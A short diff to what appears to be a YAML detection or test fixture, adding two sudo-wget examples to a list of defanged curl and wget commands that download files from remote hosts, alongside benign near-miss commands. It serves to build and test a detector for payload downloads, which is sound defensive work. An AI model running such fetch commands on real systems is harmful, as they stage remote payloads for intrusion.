@@ -67,6 +67,8 @@ techniques:
       - 'curl -o /tmp/x hxxp://203[.]0[.]113[.]9/x'
       - 'curl -fsSLO hxxps://beispiel[.]test/x.tar.gz'
       - 'busybox wget hxxp://beispiel[.]test/bins.sh'
+      - 'if true; then sudo wget hxxp://example[.]org/a'
+      - '/bin/sudo wget hxxp://example[.]org/a'
     near_misses:
       - 'apt-get install -y wget curl'
       - 'curl -s hxxps://beispiel[.]test/ip'
